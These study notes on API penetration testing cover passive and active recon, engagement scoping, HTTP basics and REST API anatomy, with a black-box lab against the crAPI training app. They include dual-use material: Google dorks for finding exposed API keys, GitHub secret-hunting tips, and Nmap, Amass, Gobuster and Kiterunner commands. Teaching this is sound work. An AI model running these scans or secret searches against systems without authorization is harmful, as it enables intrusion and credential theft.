# 🕵️ Passive Recon (API Hacking)

> **Passive Recon** = gathering information about a target **without directly interacting with its devices**. The target never knows you're investigating.

---

## 🎯 What is the Attack Surface?

The **attack surface** is the total set of systems exposed over a network from which you could:

- 📤 Extract data
- 🚪 Gain entry to other systems
- 💥 Interrupt availability

---

## 📚 OSINT: What Are We Looking For?

**OSINT** (Open-Source Intelligence) = data collected from publicly available sources.

|🔎 Target|💡 Why?|
|---|---|
|API endpoints|They become targets in Active Recon|
|Credentials|Test as a regular user or, better, as an **admin**|
|Version info|Reveals past vulnerabilities and _improper assets_|
|API documentation|Tells you exactly how to test the API|
|Business purpose|Gives insight into _business logic flaws_|

### 🚨 Critical Findings (report immediately)

- 🔑 API keys / credentials / **JWTs**
- 👤 PII: SSNs, full names, emails, credit card data

---

## 🔄 The Passive Recon Process (3 Phases)

```
Phase 1 ──▶ Phase 2 ──▶ Phase 3
Cast Wide    Adapt &     Document
  Net        Focus      Attack Surface
     ▲__________________________|   (repeat until the surface is mapped)
```

### 1️⃣ Cast a Wide Net 🌐

- Run general searches with **Google, Shodan, ProgrammableWeb** → usage, architecture, docs, business purpose
- Use **DNS Dumpster** and **OWASP Amass** to map the target's hosts

### 2️⃣ Adapt and Focus 🎯

- Make search queries more specific
- Combine findings from different tools
- Search **GitHub** and use **Pastehunter** to find exposed sensitive data

### 3️⃣ Document the Attack Surface 📝

- Take **screenshots** and notes of everything interesting
- Build a **task list** and revisit it during active exploitation

> 💡 **Tip:** Use multiple tools to confirm your results.

---

## 🔍 Tool 1: Google Hacking (Dorking)

Clever use of advanced search operators to find API keys, usernames, and vulnerabilities.

### Query Operators

|Operator|Purpose|
|---|---|
|`intitle`|Search page titles|
|`inurl`|Search words in the URL|
|`filetype`|Search for file types|
|`site`|Limit to specific sites|

### ✅ Strategy

1. Start broad (`inurl:/api/` → 2M+ results 😵)
2. Add the target's domain → `intitle:"<targetname> api key"`

### 🗃️ GHDB (Google Hacking Database)

🔗 https://www.exploit-db.com/google-hacking-database

|Query|Result|
|---|---|
|`inurl:"/wp-json/wp/v2/users"`|WordPress API user directories|
|`intitle:"index.of" intext:"api.txt"`|Public API key files|
|`inurl:"/includes/api/" intext:"index of /"`|API directories|
|`ext:php inurl:"api.php?action="`|XenAPI SQL injection|
|`intitle:"index of" api_key OR "api key" OR apiKey -pool`|⭐ Exposed API keys|

---

## 🔍 Tool 2: ProgrammableWeb

🔗 https://www.programmableweb.com is a directory of **23,000+ APIs**.

**What you can find:**

- 📍 Endpoint and portal locations
- 🔢 Versions and **changelog** (past vulnerabilities)
- 🔐 Authentication model
- 📦 SDKs and libraries (possibly vulnerable software)
- 📖 Docs, tutorials, source code

> 📌 **SDK** = A collection of tools, libraries, and documentation used to build applications.

**Other directories:** `rapidapi.com` • `apis.guru/browse-apis`

🏦 **Example:** The Medici Bank API handles customer data and financial transactions, so it's a **high-risk API**.

---

## 🔍 Tool 3: Shodan

🔗 https://shodan.io is a search engine for internet-connected devices (it scans the whole IPv4 space).

Useful when you only have an **IP address** or an **organization name**.

|Query|Purpose|
|---|---|
|`hostname:"targetname.com"`|Basic search for the target's domain|
|`"content-type: application/json"`|Filter JSON responses|
|`"content-type: application/xml"`|Filter XML responses|
|`"200 OK"`|Successful requests only|
|`"wp-json"`|WordPress API|

**Example:**

```
"ewise.com" "content-type: application/json"
```

➡️ Found an endpoint (Nginx + JSON + 401 response) **without any API-style naming**.

---

## 🔍 Tool 4: OWASP Amass

Command-line tool that collects OSINT from **55+ sources** (Google, Bing, Shodan, Censys, GitHub, Wayback...).

|Mode|Behavior|
|---|---|
|🟢 `-passive`|Does not touch the target|
|🔴 `-active`|Contacts the target (certs, DNS zone transfers)|

### 💻 Commands

```bash
# 1. Passive scan, filter API-related results
amass enum -passive -d twitter.com | grep api

# 2. Intel: find domains from IPs
amass intel -addr <target IP addresses>

# 3. Reverse Whois lookup
amass intel -d <target domain> -whois

# 4. Passive subdomain enumeration
amass enum -passive -d <target domain>

# 5. Active scan (DNS resolution + zone transfer + SSL certs)
amass enum -active -d <target domain>

# 6. Brute-force subdomains with an API wordlist
amass enum -active -brute -w /usr/share/wordlists/API_superlist \
  -d <target domain> -dir <directory name>

# 7. Visualize results (HTML d3 graph)
amass viz -enum -d3 -dir <directory name>
```

⚠️ **Note:** Subdomains like `legacy-api.twitter.com` may point to **Improper Asset Management** (OWASP API Top 10).

---

## 🔍 Tool 5: GitHub Exposure

Even if the target doesn't develop software itself, **always check GitHub**.

**Search:** `<target name>` + `api-key` / `password` / `token`

### 📑 Repository Tabs

|Tab|What to look for|
|---|---|
|💻 **Code**|Source code, `CTRL-F` for `API`/`key`/`secret`, and commit **History**|
|🐛 **Issues**|Open issue = vulnerability likely still live. Closed? Check commits around that date|
|🔀 **Pull Requests**|A PR removing a key still shows it under **Files Changed** until merged|

> 💡 **Tip:** Use the **Split** button to compare old vs. new code side by side.

**Found nothing?** Note the **programming languages**, endpoints, and docs to build the target's profile.

---

## ✅ Quick Summary

```
🌐 Google Dorks    → API keys, exposed files
📚 ProgrammableWeb → docs, versions, auth model
🛰️ Shodan          → exposed endpoints/ports
🗺️ Amass           → subdomains (legacy, api2, ...)
🐙 GitHub          → secrets in code/issues/PRs
📝 Document        → screenshots + task list
```
# ⚡ Active Recon (API Hacking)

> **Active Recon** = collecting information **directly from the target** (port scans, pings, HTTP requests, API calls). It validates what passive recon found secondhand.

---

## 🔄 The Active Recon Process

```
Phase 0: Opportunistic Exploitation (anytime a vuln appears 💥)
        │
Phase 1 ──▶ Phase 2 ──▶ Phase 3
Detection   Hands-on    Targeted
Scanning    Analysis    Scanning
   ▲___________________________|   (not linear, loop back often)
```

- ⏱️ **Efficient:** you keep working by hand while automated scans run in the background
- 🔁 Hit a dead end? Go back and check your scan results
- ✅ Exploit succeeds → **post-exploitation**. Fails → back to scans and analysis

### 0️⃣ Opportunistic Exploitation 💥

Found a vulnerability at any point (a comment in a page, after seconds or months)? **Try to exploit it immediately**, then return to the phases. Learn when to avoid rabbit holes and when to go all in.

### 1️⃣ Detection Scanning 🔭

- General scans for **hosts, open ports, services, OS** (Nmap)
- APIs use **HTTP/HTTPS**: once detected, leave the scan running and move to phase 2

### 2️⃣ Hands-on Analysis 🖱️

Explore the web app with a **browser + API client**: examine pages, intercept requests, find API links/docs, understand the business logic.

Consider **3 perspectives**:

|👤 User type|Questions to ask|
|---|---|
|🚶 **Guest**|How would a new user use the site? Can they interact with the API? Are docs public?|
|🔐 **Authenticated user**|What can I do now that I couldn't as a guest? File uploads? New sections? API access? How does the app recognize I'm authenticated?|
|👑 **Administrator**|Where is the admin login? What's in the page source? Comments? Languages in use? Experimental sections?|

Then analyze **as a hacker** by intercepting traffic with **Burp Suite** (searches and logins often use API requests).

### 3️⃣ Targeted Scanning 🎯

Refine scans using what you learned: API type and version, web app type, service versions, HTTP vs HTTPS, active ports.

- API on a **nonstandard port** → scan that port closely
- **WordPress** app → check `/wp-json/wp/v2`
- Known URLs → **brute-force URIs** to find hidden directories and files (Gobuster)

---

## 🛠️ Tool 1: Nmap (Baseline Scanning)

Port scanning, service enumeration, host discovery. Best for **phase 1** (and later targeted scans).

### 💻 Two essential scans

```bash
# 1. General detection: default scripts + service versions
nmap -sC -sV <target or range> -oA nameofoutput

# 2. All-port scan: all 65,535 TCP ports
nmap -p- <target address> -oA allportscan
```

|Flag|Meaning|
|---|---|
|`-sC`|Default scripts|
|`-sV`|Service/version detection|
|`-p-`|All ports|
|`-oX / -oN / -oG`|Output as XML / Nmap / Greppable|
|`-oA`|All three formats|

💡 Start the all-port scan as soon as the general scan returns results. APIs are usually on **80/443**, but can be on **any port**.

---

## 🛠️ Tool 2: robots.txt

Tells crawlers what to **skip**, which ironically shows the paths the target wants to **hide**.

```
https://target.com/robots.txt
```

```
User-agent: *
Disallow: /appliance/
Disallow: /login/
Disallow: /api/      ← 👀 interesting!
Disallow: /files/
```

---

## 🛠️ Tool 3: Chrome DevTools

Open with **F12** or **CTRL+SHIFT+I**.

|🧰 Tab|What to do|
|---|---|
|🌐 **Network**|Refresh the page. Look for files named "API". Right-click a JS file → **Open in Sources Panel**. Use the **XHR** filter for Ajax requests|
|🔎 **Sources**|Search (`CTRL+F`) for `API`, `APIkey`, `secret`, `password`|
|🧠 **Memory**|**Heap Snapshot** → Take Snapshot → search for `api`, `v1`, `v2`, `swagger`, `rest`, `dev`. Compare snapshots (authenticated vs unauthenticated)|
|⏱️ **Performance**|Record an action (e.g. click login) and review the timeline for background API calls (peaks = events)|

📌 **Example:** clicking login triggers `POST /identity/api/auth/login` → API discovered.

📚 Wordlists: **Assetnote** (http://wordlists.assetnote.io)

---

## 🛠️ Tool 4: Burp Suite (Validating APIs)

**Validate** discoveries:

1. Intercept a request in the browser
2. **Forward** it
3. Send it to **Repeater** and read the raw response

|Response|Meaning|
|---|---|
|`401 Unauthorized`|Endpoint exists, auth required ✅|
|`404 Not Found`|Resource doesn't exist ❌|

💡 **Trick:** request a nonexistent path (e.g. `GET /user/test098765`) to learn how the server normally responds to missing resources, then compare.

The `WWW-Authenticate` header may reveal paths like `/api/auth`.

---

## 🛠️ Tool 5: OWASP ZAP (Crawling URIs)

Two ways to find URIs: **crawling** (ZAP) and **brute force** (Gobuster).

### Automated scan

1. Open ZAP → **Quick Start** → enter target URL → **Attack**
2. Watch results in the **Spider** or **Sites** tab
3. Use the **Search** tab for `API`, `GraphQL`, `JSON`, `RPC`, `XML`

### Manual Explore (ZAP HUD)

1. **Quick Start → Manual Explore** → choose browser → **Launch Browser**
2. Click **Continue to Your Target**
3. Browse normally while ZAP scans in the background
4. 🚩 **Colored flags** = alerts (vulns or anomalies)

---

## 🛠️ Tool 6: Gobuster (Brute-Forcing URIs)

CLI tool to brute-force **directories and subdomains** (GUI alternative: OWASP **Dirbuster**). Much faster than Burp Community Intruder.

⚖️ Balance **wordlist size vs time**:

- `/usr/share/wordlists/dirbuster` → thorough but slow
- `~/api/wordlists` → short, API-focused ⚡

### 💻 Commands

```bash
# Basic directory scan with an API wordlist
gobuster dir -u http://192.168.195.132:8000 \
  -w /home/hapihacker/api/wordlists/common_apis_160

# Show help
gobuster dir -h

# Add status codes (-x) and ignore others (-b)
gobuster dir -u http://targetaddress/ \
  -w /usr/share/wordlists/api_list/common_apis_160 \
  -x 200,202,301 -b 302
```

**Example output:**

```
/api      (Status: 200)
/admin    (Status: 500)
/login    (Status: 200)
/register (Status: 200)
```

---

## 🛠️ Tool 7: Kiterunner

The **best tool for discovering API endpoints**.

|Gobuster 🐢|Kiterunner 🚀|
|---|---|
|Mostly `GET` requests|**GET, POST, PUT, DELETE**|
|Plain path lists|**Mimics real API path structures** (e.g. `POST /api/v1/user/create`)|

### 💻 Commands

```bash
# Quick scan with a .kite wordlist
kr scan http://192.168.195.132:8090 \
  -w ~/api/wordlists/data/kiterunner/routes-large.kite

# Brute force with a text wordlist
kr brute <target> -w ~/api/wordlists/data/automated/nameofwordlist.txt

# Replay an interesting request (paste the full result line)
kr kb replay "GET 414 [ 183, 7, 8] http://192.168.50.35:8888/api/privatisations/count <hash>" \
  -w ~/api/wordlists/data/kiterunner/routes-large.kite
```

📋 **Multiple targets:** save them line by line in a text file:

```
Test.com
Test2.com:443
http://test3.com
http://test5.com:8888/api
```

⚠️ The example scan ran **without authorization headers** (covered in Chapter 7).

💡 After results: pivot to **Postman** and **Burp Suite** for deeper testing.

---

## 🧪 Lab #3: Active Recon, Black Box Test (crAPI)

**Scenario:** crAPI Car Services wants a **black box** API pentest (no IP, ports, or docs given).

### 🪜 Steps

|#|Step|Command / Action|
|---|---|---|
|1️⃣|Find the target IP|`netdiscover`, then confirm in a browser|
|2️⃣|General Nmap scan|`nmap -sC -sV 192.168.50.35 -oA crapi_scan`|
|3️⃣|All-port scan|`nmap -p- 192.168.50.35`|
|4️⃣|Visit every HTTP port|8000, 8025, 8080, 8087, 8888|
|5️⃣|DevTools: Network → Sources|Search `API` in the main JS file|
|6️⃣|Intercept signup with Burp|Use FoxyProxy "Hackz" proxy|

### 🔍 Findings

|Port|Service|Notes|
|---|---|---|
|1025|SMTP (Postfix)|Mail service|
|5432|PostgreSQL|Database|
|8000|WSGIServer (CPython)|"Resource not found"|
|8025|**MailHog**|"Welcome to crAPI" email (found in all-port scan)|
|8080|OpenResty|`{"error": "Invalid Token"}` + JSON header → **API!**|
|8087||404 page|
|8888|**crAPI login page**|Main web app|
|27017|**MongoDB**|Uncommon port (all-port scan)|

### 🎉 Result

- Found `/static/js/main.f6a58523.chunk.js` → many **API endpoints** via DevTools
- Burp captured: `POST /identity/api/auth/signup` → **API confirmed** and interacted with

---

## ✅ Quick Summary

```
🔭 Nmap          → ports, services, versions (phase 1)
🤖 robots.txt    → hidden paths the target wants secret
🧰 DevTools      → JS source, memory, performance → API paths
🔥 Burp Suite    → intercept + validate (401 vs 404)
🕷️ ZAP           → crawl + manual explore (HUD)
🗂️ Gobuster      → brute-force directories (GET)
🪁 Kiterunner    → API-aware brute force (all methods)
```

> 🔑 **Key idea:** you can't attack an API you can't find. Passive recon shows the public exposure, and active recon reveals the real operating context (OS, API type/version, software versions, known exploits).

# 🛡️ Preparing for Your Security Tests (API Pentest Scoping)

> API pentesting is **its own service**: it doesn't fit a general pentest or a web app pentest. Good **scoping** tells you how much work is needed, what to test, and keeps you out of trouble.

---

## 🧩 What Scoping Depends On

```
📐 Methodology      🔢 Magnitude of testing   🎯 Target features
🚫 Restrictions     📄 Reporting needs        🔁 Remediation testing
```

---

## ✍️ 1. Receiving Authorization

⚠️ **Never attack without a signed contract** (e.g. a **SOW**, Statement of Work) listing approved targets and a time frame.

### ✅ Checklist

- 🧑‍💼 Does the signer have the **authority** to approve testing?
- 🏢 Does the client **own** the assets? (If not, get the real owner's approval)
- ☁️ Check **where the APIs are hosted** (software _and_ hardware)
- 📝 Document everything: contract, reminder emails, notes
- ⚖️ Consider consulting a **lawyer** to reduce risk

💡 **Tip:** if clients are too restrictive, explain calmly that **criminals have no scope**: they don't avoid production subnets or inconvenient hours.

---

## 🎭 2. Threat Modeling an API Test

**Threat modeling** = mapping the threats to an API provider so tests **match real attackers**.

**Threat actor** = the adversary: a random member of the public, a customer, a rogue business partner, or an insider.

### 🎨 Three Testing Approaches

|🎨 Approach|👤 Models|📦 Info given to tester|
|---|---|---|
|⬛ **Black box**|Opportunistic attacker|Almost nothing (just the company name). You do **OSINT** to find IPs, URLs, endpoints, then client authorizes the target list|
|🔘 **Gray box**|Better-informed attacker|In/out-of-scope targets, **API docs**, maybe a basic user account, maybe perimeter control bypass. Less recon, more active testing|
|⬜ **White box**|Inside attacker|Everything above + **source code**, design info, **SDK**... The more info, the more thorough the test|

🐞 **Bug bounties** sit between black and gray box: you get approved targets, exclusions, rewarded vuln types, and allowed attacks.

### 🎯 Choosing the right approach

Base it on **threat modeling + threat intelligence**.

> Example: a small, politically unimportant business → the likely attacker is an **opportunistic, medium-skilled person** running published exploits, so use a **limited black box test**. Don't simulate an APT (nation-state): that's "a drone strike on a petty thief" 🚁

📋 **Best way to model:** survey the client (exposure, economic significance, political involvement, supply chain role, essential services, other attacker motives). Use **MITRE ATT&CK** or the **OWASP Threat Modeling Cheat Sheet**.

---

## 🔧 3. Which API Features to Test

Goal: measure the **quantity of work**. Count: `endpoints • methods • versions • features • auth/authz mechanisms • privilege levels`

Sources: client interviews, API docs, API collections → estimate **hours**.

### 🔐 Authenticated Testing

- Decide how to handle **authenticated vs unauthenticated** users and **different roles**
- Many severe API bugs live in **authentication and authorization**
- Black box? You must figure out the auth process and get authenticated

### 🧱 Web Application Firewalls (WAFs)

A **WAF** controls traffic reaching the API; it can detect request frequency/failures and **ban your IP** after a simple scan.

|Option|Idea|
|---|---|
|✅ Ideal|Client **allowlists your IP** or relaxes boundary security|
|❌ Otherwise|You end up testing the **WAF**, not the **API's security controls**|

🧅 Remember **layered defense**: a persistent attacker may bypass a WAF or use a zero-day.

### 📱 Mobile Application Testing

Mobile apps expand the attack surface and rely on APIs.

|Method|Description|
|---|---|
|📖 **Manual code review**|Read source code for vulns|
|🤖 **Automated source analysis**|Tools search for vulns and artifacts|
|🏃 **Dynamic analysis**|Test the **running** app, intercept client API requests and server responses|

### 📚 Auditing API Documentation

Docs include auth requirements, roles, examples, endpoints. They can be **inaccurate, outdated, or leak information**. Include a **docs audit** in gray/white box scope: it exposes weaknesses and **business logic flaws**.

### 🚦 Rate Limit Testing

**Rate limiting** = cap on requests per time frame. It allows **monetization** and prevents **resource overuse**.

> Docs usually say: _"You may make X requests within Y time. Exceed it and you get Z response."_ Example: Twitter's tiers (15 or 180 requests per 15 min). Exceeding returns **HTTP 420**.

⚖️ **Rate limit testing ≠ DoS testing**

|🚦 Rate limit testing|💣 DoS testing|
|---|---|
|Tries to **bypass** request restrictions|Tries to **disrupt** availability|
|Doesn't necessarily disrupt services|Tests infrastructure resilience|
|Shows monetization/control weakness|Opt-in only|

Without controls: the provider **loses money**, pays for extra resources, and becomes **DoS-vulnerable**.

---

## 🚫 4. Restrictions and Exclusions

- 🔇 Assume **no DoS/DDoS** unless explicitly authorized (rare, and written in formal docs)
- 🎣 **Social engineering** (phishing, vishing, smishing) is usually a **separate** exercise. Always ask.
- 🐞 **Bug bounties** by default ban: social engineering, DoS/DDoS, attacking customers, accessing customer data. Use **your own test accounts** instead.
- 📌 **Known issues** may be accepted risks (e.g. a forgot-password message that reveals whether an email exists)
- 🛤️ **Path-level exclusions**, e.g. allowed: `/api/accounts`, forbidden: `/api/shared/accounts`
- 🔑 **Third-party auth** may be out of scope

---

## ☁️ 5. Security Testing Cloud APIs

Attacking a cloud-hosted app = attacking the **provider's physical servers**. Know the provider's pentest policy.

|☁️ Provider|Policy|
|---|---|
|**AWS**|Most testing allowed. **Not allowed:** DNS zone walking, DoS/DDoS (and simulated), port flooding, protocol flooding, request flooding. For exceptions, **email AWS** with dates, accounts/assets, phone number, attack description|
|**GCP**|**No permission needed**, but follow the **AUP and TOS** (no illegal actions, phishing, spam, malware, service interruption) and stay in scope|
|**Azure**|**No notification needed**. See Microsoft's **Penetration Testing Rules of Engagement** page|

⚠️ Some apps (e.g. **Salesforce APIs**) still need authorization. Always check the **current** requirements.

---

## 💣 6. DoS Testing

- Treat as **opt-in** for clients wanting performance/reliability testing
- DoS (even accidental) disrupts the business → often triggers **legal action**
- Depends on the client's **risk appetite**:

|🔥 High risk appetite|🥚 Risk-averse|
|---|---|
|Cutting-edge, confident in security|Detailed scope, every machine spelled out|
|Test every feature, run all exploits|"Walking on eggshells": ask permission before some exploits|

---

## 📝 7. Reporting and Remediation Testing

- 📄 The **report** is the client's most valuable deliverable: list vulnerabilities + how to fix them
- 🔁 **Remediation testing** (retest) validates fixes:
    - 🎯 Only the **weak spots**, or
    - 🔄 A **full retest** (checks that fixes didn't introduce new weaknesses)

---

## 🐞 8. Note on Bug Bounty Scope

Platforms: **BugCrowd**, **HackerOne**. Companies with own programs: Google, Microsoft, Apple, Twitter, GitHub. Many offer **API-specific bounties** (e.g. Files.com on BugCrowd).

⚠️ Two contracts to respect: the **platform's TOS** and the **program scope**. Violations → ban and legal trouble.

### 📋 Bug Bounty Considerations

|Item|Meaning|
|---|---|
|🎯 **Targets**|Approved URLs (check subdomains: some are out of scope)|
|📢 **Disclosure terms**|Rules on publishing findings|
|🚫 **Exclusions**|URLs excluded from testing/rewards|
|⛔ **Testing restrictions**|Rewarded vuln types; usually need **proof of real-world exploit**|
|⚖️ **Legal**|Laws based on org, customer, data center locations|

💡 **Tips:**

- Know the **reward** for each vuln type before investing time (rate limit bugs may be called "spam")
- Review **past disclosures**: is the org combative or unwilling to pay?
- Study **successful reports**: what evidence and how they were written

📚 Resources: **BugCrowd University** (API security by Sadako), **Bug Bounty Bootcamp** (Vickie Li, No Starch Press)

---

## ✅ Quick Summary

```
✍️ Authorization  → signed SOW, right owner, documented
🎭 Threat model   → black / gray / white box based on real attacker
🔧 Features       → endpoints, auth, WAF, mobile, docs, rate limits
🚫 Exclusions     → no DoS / social engineering unless allowed
☁️ Cloud          → AWS (limits) • GCP (AUP/TOS) • Azure (RoE)
💣 DoS            → opt-in, depends on risk appetite
📝 Report + retest → findings, fixes, remediation validation
🐞 Bug bounty     → read TOS + scope carefully
```

> 🔑 **Key idea:** if you test **only within the documented scope**, you're set for a legal, ethical, and successful engagement.


# 🌐 How Web Applications Work

> Web APIs are powered by the same technologies as web apps (HTTP, authentication/authorization, databases). Understand these first and APIs become easy to hack.

---

## 🖥️ 1. Web App Basics

**Client/Server model:** your browser (**client**) sends requests → **web server** sends resources back.

|📄 Website|⚙️ Web application|
|---|---|
|Mostly read-only|**Two-way** communication|
|Server → client|Server ⇄ client|
|Static content|Interactive (Reddit: post, vote, comment, customize)|

Examples of web apps: Wikipedia, LinkedIn, Twitter, Gmail, GitHub, Reddit.

---

## 🔗 2. The URL

```
Protocol://hostname[:port]/[path]/[?query][&parameters]
```

|Part|Meaning|
|---|---|
|🔌 **Protocol**|Rules for communication: HTTP/HTTPS (web), FTP (files)|
|🏷️ **Hostname**|The server's domain|
|🚪 **Port**|Only shown if non-default|
|📂 **Path**|Location of the page/file on the server|
|❓ **Query**|Optional (search, filter, language, tracking) starts with `?`|
|🧩 **Parameters**|Values for the query, separated by `&`|

### 🚪 Default ports

|Service|Port|
|---|---|
|HTTP|**80**|
|HTTPS|**443**|
|FTP|**21**|
|Alt HTTP / HTTPS|8080 / 8443|

### 🔍 Example

```
https://twitter.com/search?q=hacking&src=typed_query
```

- Protocol: `https` • Host: `twitter.com` • Path: `search`
- Query: `?q` → value `hacking` • Tracking parameter: `src=typed_query`

---

## 📤 3. HTTP Requests

The browser automatically builds a request when you visit a URL.

```http
POST /sessions HTTP/1.1
Host: twitter.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) ...
Accept: text/html,application/xhtml+xml,...
Content-Type: application/x-www-form-urlencoded
Content-Length: 444
Cookie: _personalization_id=...

username_or_email%5D=hAPI_hacker&password%5D=NotMyPassword%21
```

|Component|Description|
|---|---|
|**Method**|What you want to do (`POST`)|
|**Path**|Requested resource (`/sessions`)|
|**Version**|`HTTP/1.1`|
|**Headers**|Key-value pairs (`Host`, `User-Agent`, `Accept`, `Cookie`...)|
|**Body**|Data to process (here: username + password)|

💡 Special characters are **encoded** (e.g. `!` → `%21`).

---

## 📥 4. HTTP Responses

```http
HTTP/1.1 302 Found
location: https://twitter.com/
set-cookie: auth_token=8ff3f...; Secure; HTTPOnly; SameSite=None
```

- **Response headers** give the browser handling/security instructions
- `set-cookie` with an **auth_token** = authentication succeeded 🔑
- Body follows after an empty line

### 🔐 Authentication vs Authorization

||Meaning|
|---|---|
|🪪 **Authentication**|Proving **who you are** (password, token, biometrics)|
|🚦 **Authorization**|What you're **allowed to access** after authenticating|

⚠️ **HTTP is cleartext.** Anyone intercepting can read credentials. **HTTPS = HTTP + TLS** encrypts traffic.

---

## 🔢 5. HTTP Status Codes

|Range|Type|Meaning|
|---|---|---|
|**1xx**|ℹ️ Informational|Processing status updates|
|**2xx**|✅ Success|Request accepted (`200 OK`)|
|**3xx**|↪️ Redirect|Moved/redirected (e.g. HTTP → HTTPS)|
|**4xx**|❌ Client error|Not found, forbidden, timeout (`404`, `401`, `403`)|
|**5xx**|💥 Server error|Internal error, unavailable service|

---

## 🔧 6. HTTP Methods (Verbs)

|Method|Purpose|Idempotent?|
|---|---|---|
|**GET**|Retrieve a resource|✅|
|**POST**|Submit data (creates new results each time)|❌|
|**PUT**|Store/replace data at a URL|✅|
|**HEAD**|Like GET, but headers only|✅|
|**PATCH**|Partially update a resource (needs `Accept-Patch` header)|❌|
|**OPTIONS**|List allowed methods|✅|
|**TRACE**|Echo back the request (debugging)||
|**CONNECT**|Open a two-way tunnel (proxy)|❌|
|**DELETE**|Remove a resource|✅|

### 💡 Idempotent explained

> Flip a light switch "on" repeatedly: it stays on. Same request many times = **same result**.

- **POST ×10** → 10 new resources 📦
- **PUT ×10** → 1 resource overwritten 10 times 🔁
- **DELETE ×10** → deleted once, then nothing happens

📌 Web APIs mostly use: **GET, POST, PUT, DELETE**.

---

## 🔄 7. Stateful vs Stateless HTTP

**HTTP is stateless** (the server doesn't remember between requests), but apps need memory (e.g. a shopping cart).

|🧠 Stateful|🪶 Stateless|
|---|---|
|Server tracks the session|Server stores **no** session info|
|Uses **cookies** on client|Each request carries **all needed info** (token / auth header)|
|Tied to one browser; switching device = re-authenticate|Works from any device|
|Hard to **scale** (limited by server resources)|**Scales easily** across many servers|
|Attack: steal/forge **cookies**|Attack: steal/forge **tokens**|

🔑 **APIs are stateless**: the state is kept in backend databases, identified by a token.

---

## 🗄️ 8. Web Server Databases

Databases let servers **store and quickly serve** data.

### Frontend vs Backend

|🎨 Frontend|⚙️ Backend|
|---|---|
|What the user sees/interacts with|Server, application, databases|
|HTML, CSS, JavaScript|JavaScript, Python, Ruby, Go, PHP, Java, C#, Perl|
|Frameworks: AngularJS, ReactJS, Bootstrap||

🛡️ A secure app has **no direct user ↔ database access**. Less exposure = **smaller attack surface**.

### 🧱 SQL (Relational)

Data organized in **tables**: rows = records, columns = attributes.

|UserID|Username|Email|Privilege|
|---|---|---|---|
|111|hAPI_hacker|hapi_hacker@email.com|admin|
|112|Scuttleph1sh|scuttleph1sh@email.com|partner|
|113|mysterioushadow|mysterioushadow@email.com|user|

```sql
SELECT * FROM Email WHERE UserID = 111;
```

|Keyword|Meaning|
|---|---|
|`SELECT`|Get data|
|`*`|All columns|
|`FROM`|Which table|
|`WHERE`|Filter results|

**Examples:** MySQL, Microsoft SQL Server, PostgreSQL, Oracle, MariaDB. ⚠️ **SQL injection** is a 20+ year old attack that still works on APIs.

### 📄 NoSQL (Non-relational / Distributed)

Stores **documents** as **key-value** pairs. Each type has its own structure, query language, and vulnerabilities.

```js
db.collection.find({"UserID": 111})
db.collection.find({"UserID": {$gt:110}})   // all UserIDs > 110
```

|Operator|Meaning|
|---|---|
|`$eq`|Equal to|
|`$gt`|Greater than|
|`$lt`|Less than|
|`$ne`|Not equal to|

**Examples:** MongoDB (market leader), Couchbase, Cassandra, IBM Domino, Oracle NoSQL, Redis, Elasticsearch. 💡 Knowing these operators helps later with **NoSQL injection**.

---

## 🔌 9. How APIs Fit In

**API** = lets separate applications **talk to each other**. **Web APIs** = machine-to-machine communication over **HTTP**.

🚗 **Example: ridesharing app**

```
🗺️ Google Maps API  → navigation
💳 Stripe API       → payments
💬 Twilio API       → SMS messaging
```

### Two big impacts

1. 🔄 **Streamlined data exchange** (standard HTTP methods, status codes, client/server model)
2. 🎯 **Specialization** (devs don't build every feature)

⚠️ Downside: APIs **expand the attack surface** of every app using them.

---

## ✅ Quick Summary

```
🔗 URL        → protocol://host:port/path?query=value
📤 Request    → method + path + headers + body
📥 Response   → status code + headers + body
🔢 Codes      → 1xx info • 2xx ok • 3xx redirect • 4xx client • 5xx server
🔧 Methods    → GET, POST, PUT, DELETE (+ PATCH, HEAD, OPTIONS...)
🧠 State      → stateful = cookies • stateless = tokens (APIs)
🗄️ Databases  → SQL (tables) vs NoSQL (documents)
🔌 APIs       → machine-to-machine over HTTP
```

> 🔑 **Key idea:** this chapter gives you "just enough to be dangerous as an API hacker": the same tech that powers web apps powers web APIs.

📚 **Further reading:** _The Web Application Hacker's Handbook_ • _Web Application Security_ (O'Reilly) • _Web Security for Developers_ • _The Tangled Web_

# 🧬 The Anatomy of Web APIs

> Under the GUI, **APIs do the real work**: they let applications use each other's functionality and data over HTTP.

---

## ⚙️ 1. How Web APIs Work

**Provider** = hosts the API • **Consumer** = system/person making requests

|Term|Meaning|
|---|---|
|📍 **Endpoint**|A URL to interact with part of the API (`/api/v3/users/`)|
|📦 **Resource**|The data being requested|
|1️⃣ **Singleton**|One unique object: `/api/user/{user_id}`|
|📚 **Collection**|Group of resources: `/api/profiles/users`|
|🗂️ **Subcollection**|Collection inside a resource: `/api/user/{user_id}/settings`|

### 🚪 API Gateway

Entry point that sits in front of the app. It:

- 🛡️ Filters bad requests and monitors traffic
- 🔀 Routes to the right service/microservice
- 🔐 Handles authentication, authorization, SSL, **rate limiting**, load balancing

### 🧩 Microservices vs Monolithic

|🧱 Monolithic|🧩 Microservices|
|---|---|
|All services in one application|Each service is its own standalone app|
||Services talk through APIs|

The consumer **only sees endpoints**, not the backend design.

### 📖 API Contract (Documentation)

Human-readable docs: auth requirements, permission levels, endpoints, parameters, examples. 🎯 **For hackers:** it reveals endpoints for customer data, API keys needed for admin, and **business logic flaws**.

### 🔄 CRUD

| Action         | HTTP method          |
| -------------- | -------------------- |
| ➕ **Create**   | `POST`               |
| 👁️ **Read**   | `GET`                |
| ✏️ **Update**  | `POST` / `PUT`       |
| 🗑️ **Delete** | `DELETE` (or `POST`) |

⚠️ CRUD is a **best practice only**. Devs may do it differently, so test beyond CRUD.

### 🔤 Path variable notation

```
/applications/{client_id}/grants/{access_token}   ← curly brackets
/api/v2/:customers/                                ← colon
/api/:collection/:client_id
```

Replace the variable with a real value. **Tokens** identify and authorize approved consumers.

---

## 🏷️ 2. Standard Web API Types

### 🌿 RESTful APIs

**REST** = Representational State Transfer, a **style** (not a protocol) using HTTP methods. Replaced older **SOAP**.

#### 📏 The 6 constraints ("shoulds", not "musts")

|#|Constraint|Meaning|
|---|---|---|
|1|**Uniform interface**|Any device (mobile, IoT, laptop) accesses the same way|
|2|**Client/server**|Consumers request, providers serve|
|3|**Stateless**|Every request has everything needed (usually a token)|
|4|**Cacheable**|Response says if it can be cached (headers set expiry) → faster, scalable|
|5|**Layered system**|Client doesn't know the server architecture|
|6|**Code on demand** _(optional)_|Server can send code to the client|

⚠️ Some APIs call themselves "RESTful" without following the rules.

#### 💻 Example request/response

